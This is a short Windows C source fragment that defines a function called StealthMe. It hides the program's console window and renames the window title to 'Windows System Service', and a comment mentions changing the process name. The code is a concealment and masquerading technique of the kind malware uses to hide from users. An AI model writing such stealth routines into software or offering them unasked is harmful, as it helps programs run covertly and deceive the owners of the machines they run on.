#include <windows.h>

void StealthMe() {
    // Hide window (if console)
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
    // Change process name (by duplicating)
    // Simplified: set title
    SetConsoleTitleA("Windows System Service");
}